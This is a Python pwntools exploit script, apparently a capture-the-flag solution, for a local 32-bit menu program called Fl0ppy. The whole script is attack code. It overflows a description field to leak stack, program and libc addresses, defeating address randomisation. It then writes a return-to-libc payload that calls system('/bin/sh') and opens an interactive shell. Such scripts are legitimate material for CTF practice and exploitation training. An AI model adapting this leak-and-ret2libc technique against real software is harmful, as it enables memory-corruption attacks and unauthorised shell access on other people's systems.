#!/usr/bin/env python
from pwn import *

def choose(floppy):
    s.sendlineafter('>\n', '1')
    s.sendlineafter('2?\n\n', str(floppy))

def write(data, desc):
    s.sendlineafter('>\n', '2')
    s.sendafter('data: \n\n', data)
    s.sendafter('Description: \n\n', desc)

def read():
    s.sendlineafter('>\n', '3')
    s.recvuntil('DESCRIPTION: ')
    desc = s.recvline(False)
    s.recvuntil('DATA: ')
    data = s.recvline(False)
    return (desc, data)

def modify(which, data):
    s.sendlineafter('>\n', '4')
    s.sendlineafter('Data\n\n', str(which))
    s.sendafter(': \n', data)

def leak(addr):
    choose(2)
    modify(1, 'A' * 0x14 + p32(addr) + 'A')

    choose(1)
    return u32(read()[1][:4])

if __name__ == '__main__':
    s = process('./Fl0ppy')
    elf = ELF('./Fl0ppy')
    libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')

    choose(1)
    write('A', 'A')
    modify(1, 'A' * 0x11)
    stack_addr = u32(read()[0][0x14:0x18]) - 0x4
    log.info('stack address: %#x' % stack_addr)

    choose(2)
    write('A', 'A')

    text_base = leak(stack_addr + 0x50) - 0xa10
    log.info('text base: %#x' % text_base)

    libc_base = leak(text_base + elf.got['__libc_start_main']) - libc.symbols['__libc_start_main']
    log.info('libc base: %#x' % libc_base)

    choose(2)
    modify(1, 'A' * 0x14 + p32(stack_addr) + 'A')

    payload = ''
    payload += p32(libc_base + libc.symbols['system'])
    payload += 'A' * 4
    payload += p32(stack_addr + 0xc)
    payload += '/bin/sh\0'

    choose(1)
    modify(2, payload)

    s.sendlineafter('>\n', '5')
    s.recvuntil('=\n\n')
    s.interactive()
